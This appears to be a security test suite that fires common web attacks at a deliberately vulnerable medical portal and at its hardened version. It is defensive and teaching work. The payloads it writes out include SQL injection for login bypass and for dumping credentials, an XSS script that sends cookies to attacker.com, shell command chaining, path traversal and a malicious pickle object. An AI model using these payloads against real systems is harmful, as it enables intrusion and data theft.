"""
Security Attack Simulation Test Suite.
Directly simulates real-world attack vectors against both the baseline vulnerable application
and the remediated secure application to prove exploitability and verify remediation efficacy.
"""

import pytest
import base64
import pickle
import os
import sqlite3
from vulnerable_app.app import app as vuln_app
from vulnerable_app.database import init_db as init_vuln_db, DB_PATH as VULN_DB_PATH
from secure_app.app import app as sec_app
from secure_app.database import init_db as init_sec_db, DB_PATH as SEC_DB_PATH
from secure_app.crypto import create_signed_token


@pytest.fixture(autouse=True)
def setup_databases():
    """Initializes clean database instances before running simulations."""
    with vuln_app.app_context():
        init_vuln_db()
    with sec_app.app_context():
        init_sec_db()
    yield


@pytest.fixture
def vuln_client():
    vuln_app.config["TESTING"] = True
    with vuln_app.test_client() as client:
        yield client


@pytest.fixture
def sec_client():
    sec_app.config["TESTING"] = True
    with sec_app.test_client() as client:
        yield client


@pytest.fixture
def sec_doctor_token():
    return create_signed_token({
        "user_id": 2,
        "username": "dr_smith",
        "role": "doctor",
        "email": "drsmith@medsecure.local"
    })


@pytest.fixture
def sec_patient_token():
    return create_signed_token({
        "user_id": 4,
        "username": "john_doe",
        "role": "patient",
        "email": "john.doe@email.com"
    })


@pytest.fixture
def sec_admin_token():
    return create_signed_token({
        "user_id": 1,
        "username": "admin",
        "role": "admin",
        "email": "admin@medsecure.local"
    })


# --------------------------------------------------------------------------
# 1. SQL Injection Simulation (CWE-89)
# --------------------------------------------------------------------------
def test_sqli_authentication_bypass(vuln_client, sec_client):
    """
    ATTACK VECTOR: Classic SQL injection bypass in login authentication.
    Payload: "admin' --" with dummy password.
    """
    sqli_payload = "admin' --"

    # Vulnerable App: SQL injection succeeds in logging in as admin!
    vuln_resp = vuln_client.post("/api/login", json={
        "username": sqli_payload,
        "password": "wrong_password"
    })
    assert vuln_resp.status_code == 200
    assert vuln_resp.get_json()["status"] == "success"
    assert vuln_resp.get_json()["user"]["username"] == "admin"

    # Hardened App: Parameterized query rejects SQLi payload
    sec_resp = sec_client.post("/api/login", json={
        "username": sqli_payload,
        "password": "wrong_password"
    })
    assert sec_resp.status_code == 401
    assert sec_resp.get_json()["status"] == "error"


def test_sqli_data_extraction_search(vuln_client, sec_client, sec_doctor_token):
    """
    ATTACK VECTOR: UNION-based SQL injection in search parameter to extract user credentials.
    """
    sqli_search = "' UNION SELECT id, username, password, email, 'PWNED_CC', 'PWNED_NOTES', 1, 1 FROM users --"

    # Vulnerable App: Union SQL query executes, leaking user table
    vuln_resp = vuln_client.get(f"/api/search?q={sqli_search}")
    assert vuln_resp.status_code == 200
    vuln_data = vuln_resp.get_json()["data"]
    # Verify that user usernames/passwords were leaked in patient record search
    extracted_usernames = [r["patient_name"] for r in vuln_data]
    assert "admin" in extracted_usernames or "dr_smith" in extracted_usernames

    # Hardened App: Parameterized search treats query as literal string
    sec_resp = sec_client.get(f"/api/search?q={sqli_search}", headers={
        "Authorization": f"Bearer {sec_doctor_token}"
    })
    assert sec_resp.status_code == 200
    sec_data = sec_resp.get_json()["data"]
    # No user records leaked
    sec_names = [r["patient_name"] for r in sec_data]
    assert "admin" not in sec_names


# --------------------------------------------------------------------------
# 2. Cross-Site Scripting (XSS) Simulation (CWE-79)
# --------------------------------------------------------------------------
def test_xss_injection(vuln_client, sec_client, sec_doctor_token):
    """
    ATTACK VECTOR: Stored/Reflected XSS injection payload in patient clinical notes.
    Payload: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
    """
    xss_payload = "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"

    # Vulnerable App: Renders raw executable JavaScript
    vuln_resp = vuln_client.post("/api/notes/render", json={
        "patient_name": "Test Patient",
        "note": xss_payload
    })
    assert vuln_resp.status_code == 200
    vuln_html = vuln_resp.get_data(as_text=True)
    assert "<script>fetch('http://attacker.com/steal" in vuln_html

    # Hardened App: Context-aware HTML escaping neutralizes script execution
    sec_resp = sec_client.post("/api/notes/render", json={
        "patient_name": "Test Patient",
        "note": xss_payload
    }, headers={
        "Authorization": f"Bearer {sec_doctor_token}"
    })
    assert sec_resp.status_code == 200
    sec_html = sec_resp.get_data(as_text=True)
    assert "<script>" not in sec_html
    assert "&lt;script&gt;" in sec_html
    # Verify Content-Security-Policy header presence
    assert "Content-Security-Policy" in sec_resp.headers


# --------------------------------------------------------------------------
# 3. OS Command Injection Simulation (CWE-78)
# --------------------------------------------------------------------------
def test_command_injection(vuln_client, sec_client, sec_admin_token):
    """
    ATTACK VECTOR: OS Command Injection via shell metacharacters in ping host parameter.
    Payload: 127.0.0.1 & echo ATTACK_SUCCESSFUL
    """
    cmd_payload = "127.0.0.1 & echo ATTACK_SUCCESSFUL"

    # Vulnerable App: Executes shell command chaining
    vuln_resp = vuln_client.post("/api/diagnostics/ping", json={"host": cmd_payload})
    assert vuln_resp.status_code == 200
    assert "ATTACK_SUCCESSFUL" in vuln_resp.get_json()["output"]

    # Hardened App: Host validation rejects metacharacters with 400 error
    sec_resp = sec_client.post("/api/diagnostics/ping", json={"host": cmd_payload}, headers={
        "Authorization": f"Bearer {sec_admin_token}"
    })
    assert sec_resp.status_code == 400
    assert "Invalid host" in sec_resp.get_json()["message"]


# --------------------------------------------------------------------------
# 4. Path Traversal Simulation (CWE-22)
# --------------------------------------------------------------------------
def test_path_traversal(vuln_client, sec_client, sec_doctor_token):
    """
    ATTACK VECTOR: Directory Traversal to read database / configuration files outside storage.
    Payload: ../vulnerable_portal.db or ../../models.py
    """
    traversal_payload = "../models.py"

    # Vulnerable App: Escapes storage folder and reads source code file
    vuln_resp = vuln_client.get(f"/api/reports/download?filename={traversal_payload}")
    assert vuln_resp.status_code == 200
    assert "PatientRecord" in vuln_resp.get_json()["content"]

    # Hardened App: Strict filename whitelist and commonpath check block traversal
    sec_resp = sec_client.get(f"/api/reports/download?filename={traversal_payload}", headers={
        "Authorization": f"Bearer {sec_doctor_token}"
    })
    assert sec_resp.status_code == 400
    assert "Path traversal" in sec_resp.get_json()["message"] or "Invalid filename" in sec_resp.get_json()["message"]


# --------------------------------------------------------------------------
# 5. Insecure Deserialization Simulation (CWE-502)
# --------------------------------------------------------------------------
class MaliciousExploitPayload:
    """Mock exploit object attempting code execution upon unpickling."""
    def __reduce__(self):
        return (eval, ("'EXPLOIT_EXECUTED'",))


def test_insecure_deserialization(vuln_client, sec_client, sec_admin_token):
    """
    ATTACK VECTOR: Insecure deserialization of arbitrary Python pickle bytecode.
    """
    raw_pickle = pickle.dumps(MaliciousExploitPayload())
    pickle_b64 = base64.b64encode(raw_pickle).decode("utf-8")

    # Vulnerable App: Executes unpickling of untrusted payload
    vuln_resp = vuln_client.post("/api/backup/import", json={"payload": pickle_b64})
    assert vuln_resp.status_code == 200
    assert "EXPLOIT_EXECUTED" in vuln_resp.get_json()["restored"]

    # Hardened App: Rejects pickle payload; enforces JSON + HMAC-SHA256 signature
    sec_resp = sec_client.post("/api/backup/import", json={"signed_payload": pickle_b64}, headers={
        "Authorization": f"Bearer {sec_admin_token}"
    })
    assert sec_resp.status_code == 400
    assert sec_resp.get_json()["status"] == "error"


# --------------------------------------------------------------------------
# 6. Broken Access Control & IDOR Simulation (CWE-639 / CWE-284)
# --------------------------------------------------------------------------
def test_idor_unauthorized_record_access(vuln_client, sec_client, sec_patient_token):
    """
    ATTACK VECTOR: Insecure Direct Object Reference (IDOR).
    Patient user (created_by=4) tries to access Record #1 (created_by=2, belonging to another patient).
    """
    # Vulnerable App: Any user can fetch any record without authorization check
    vuln_resp = vuln_client.get("/api/records/1")
    assert vuln_resp.status_code == 200
    assert vuln_resp.get_json()["status"] == "success"

    # Hardened App: Blocks unauthorized access with 403 Forbidden
    sec_resp = sec_client.get("/api/records/1", headers={
        "Authorization": f"Bearer {sec_patient_token}"
    })
    assert sec_resp.status_code == 403
    assert sec_resp.get_json()["status"] == "error"
    assert "Access denied" in sec_resp.get_json()["message"]


# --------------------------------------------------------------------------
# 7. Sensitive Data Storage Exposure Simulation (CWE-312)
# --------------------------------------------------------------------------
def test_sensitive_data_at_rest_encryption():
    """
    ATTACK VECTOR: Direct inspection of database file reveals unencrypted PII in vulnerable DB
    while hardened DB stores AES-128-CBC + HMAC authenticated ciphertext.
    """
    # Check vulnerable database directly
    conn_vuln = sqlite3.connect(VULN_DB_PATH)
    cursor_vuln = conn_vuln.cursor()
    cursor_vuln.execute("SELECT ssn, credit_card FROM patient_records WHERE id = 1")
    v_ssn, v_cc = cursor_vuln.fetchone()
    conn_vuln.close()
    assert v_ssn == "000-12-3456"  # CLEAR TEXT LEAK!
    assert v_cc == "4111-2222-3333-4444"  # CLEAR TEXT LEAK!

    # Check hardened database directly
    conn_sec = sqlite3.connect(SEC_DB_PATH)
    cursor_sec = conn_sec.cursor()
    cursor_sec.execute("SELECT ssn_encrypted, credit_card_encrypted FROM patient_records WHERE id = 1")
    s_ssn, s_cc = cursor_sec.fetchone()
    conn_sec.close()
    assert s_ssn != "000-12-3456"
    assert s_cc != "4111-2222-3333-4444"
    assert s_ssn.startswith("gAAAAA")  # Fernet AES token prefix


# --------------------------------------------------------------------------
# 8. Brute-Force & Rate Limiting Simulation (CWE-307)
# --------------------------------------------------------------------------
def test_brute_force_account_lockout(vuln_client, sec_client):
    """
    ATTACK VECTOR: Dictionary brute-force password guessing against user account.
    """
    target_user = "john_doe"

    # Vulnerable App: 6 failed attempts permitted without throttling or lockout
    for _ in range(6):
        vuln_resp = vuln_client.post("/api/login", json={
            "username": target_user,
            "password": "WrongPasswordGuess"
        })
        assert vuln_resp.status_code == 401

    # 7th attempt is still processed without lockout
    vuln_resp_7 = vuln_client.post("/api/login", json={
        "username": target_user,
        "password": "WrongPasswordGuess"
    })
    assert vuln_resp_7.status_code == 401

    # Hardened App: 5 failed attempts trigger account lockout
    for i in range(5):
        sec_client.post("/api/login", json={
            "username": target_user,
            "password": "WrongPasswordGuess"
        })

    # 6th attempt is blocked by account lockout policy
    locked_resp = sec_client.post("/api/login", json={
        "username": target_user,
        "password": "Password123!"  # Even with the CORRECT password now, it's locked!
    })
    assert locked_resp.status_code == 401
    assert "locked" in locked_resp.get_json()["message"].lower()


# --------------------------------------------------------------------------
# 9. HTTP Security Headers Defense Simulation (CWE-693)
# --------------------------------------------------------------------------
def test_http_security_headers_enforcement(vuln_client, sec_client):
    """
    Verifies that hardened application enforces modern defense-in-depth headers.
    """
    vuln_resp = vuln_client.get("/api/login")
    assert "Content-Security-Policy" not in vuln_resp.headers
    assert "X-Frame-Options" not in vuln_resp.headers

    sec_resp = sec_client.get("/api/login")
    assert "Content-Security-Policy" in sec_resp.headers
    assert sec_resp.headers["X-Frame-Options"] == "DENY"
    assert sec_resp.headers["X-Content-Type-Options"] == "nosniff"
    assert "Strict-Transport-Security" in sec_resp.headers
